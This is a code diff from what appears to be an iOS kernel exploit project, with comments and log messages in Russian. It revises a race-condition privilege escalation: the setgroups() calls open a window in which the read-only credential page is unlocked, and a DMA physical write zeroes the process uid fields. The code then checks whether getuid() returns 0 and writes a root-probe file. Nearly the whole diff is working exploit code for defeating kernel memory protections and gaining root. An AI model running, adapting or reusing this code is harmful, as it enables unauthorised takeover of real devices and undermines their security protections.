@@ -8026,40 +8026,34 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 uint32_t uoff = (uint32_t)(ucF & 0x3fff);
                 uint64_t pagePA = kvtophys(pageVA);
                 int errF = errno;
-                // kexproofv2 2.0.24 [UUNLOCK-RACE] — setgroups() пишет cr_groups
-                // в ucred через zalloc_ro_mut: SPTM разблокирует RO-страницу на
-                // время записи. Пока открыта — наш kwrite может пролететь.
-                // Поток-гонщик: setgroups [501] ↔ [501,502] (каждый вызов —
-                // реальная мутация). Главный: хаммер uid-кластера через alias.
-                if (pagePA && ucF) {
-                    kpNote(r, @"  [UUNLOCK-RACE] старт: setgroups-гонка + kwrite uid-кластера");
-                    uint64_t aliasU = phystokv(pagePA);
+                // kexproofv2 2.0.25 [UUNLOCK-RACE v2] — v1 паниковал: early_kwrite64
+                // делает RMW, и её LOAD по aperture-алиасу попадал в окно
+                // перестройки маппинга при zalloc_ro_mut (паника 10:17:13).
+                // Правило: во время гонки НИКАКОГО CPU-доступа к алиасу/ucF.
+                // Только: setgroups (открывает окно) → DMA-запись (фабрика, без
+                // CPU) → getuid() (syscall, безопасен).
+                if (pagePA && ucF && svc && tsdV && ttM && isTable && (uoff + 0x80 <= 0x4000)) {
+                    kpNote(r, @"  [UUNLOCK-RACE v2] старт: setgroups → DMA-запись → getuid (без alias-доступа)");
                     gid_t grpsA[1] = { 501 }, grpsB[2] = { 501, 502 };
-                    uint32_t attempts = 0, landed = 0;
-                    for (int round = 0; round < 60; round++) {
-                        setgroups(1, grpsA);
-                        if (aliasU && (uoff + 0x80 <= 0x4000)) {
-                            early_kwrite64(aliasU + uoff + 0x18, 0);
-                            early_kwrite64(aliasU + uoff + 0x68, 0);
-                        }
-                        setgroups(2, grpsB);
-                        if (aliasU && (uoff + 0x80 <= 0x4000)) {
-                            early_kwrite64(aliasU + uoff + 0x18, 0);
-                            early_kwrite64(aliasU + uoff + 0x68, 0);
-                        }
-                        attempts += 2;
-                        uint32_t cruN = (uint32_t)early_kread64(ucF + 0x18);
-                        if (cruN == 0 || getuid() == 0) { landed++; break; }
+                    uint32_t attempts = 0, won = 0;
+                    uint64_t pgPA = pagePA & ~0x3fffULL;
+                    for (int round = 0; round < 300 && !won; round++) {
+                        setgroups(1, (round & 1) ? grpsA : grpsB);
+                        // DMA пишет ровно cr_uid|cr_ruid = 0 (8 байт, без RMW)
+                        kpPhysWrite8v2(svc, tsdV, ttM, isTable, pgPA, uoff + 0x18, 0, r);
+                        attempts++;
+                        if ((round % 50) == 49) kpNote(r, [NSString stringWithFormat:@"  [UUNLOCK-RACE v2] раунд %d, попыток %u, getuid()=%u",
+                                                           round + 1, attempts, getuid()]);
+                        if (getuid() == 0) { won = 1; break; }
                     }
                     uid_t gk = getuid();
-                    uint32_t cruEnd = (uint32_t)early_kread64(ucF + 0x18);
-                    kpNote(r, [NSString stringWithFormat:@"  [UUNLOCK-RACE] попыток=%u cr_uid=%u getuid()=%u — %@",
-                              attempts, cruEnd, gk, (gk == 0 || cruEnd == 0) ? @"ROOT ★★" : @"не взяло"]);
-                    if (gk == 0 || cruEnd == 0) {
+                    kpNote(r, [NSString stringWithFormat:@"  [UUNLOCK-RACE v2] попыток=%u getuid()=%u — %@",
+                              attempts, gk, gk == 0 ? @"ROOT ★★" : @"не взяло (окна не совпали)"]);
+                    if (gk == 0) {
                         gT18Root = YES;
-                        kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — UUNLOCK-RACE (setgroups unlock-окно) ===");
+                        kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — UUNLOCK-RACE v2 (DMA в окно setgroups) ===");
                         FILE *fp = fopen("/private/var/mobile/kexproof-root-probe.txt", "w");
-                        if (fp) { fputs("root via UUNLOCK-RACE\n", fp); fclose(fp); }
+                        if (fp) { fputs("root via UUNLOCK-RACE v2\n", fp); fclose(fp); }
                     }
                     setgroups(1, grpsA);
                 }
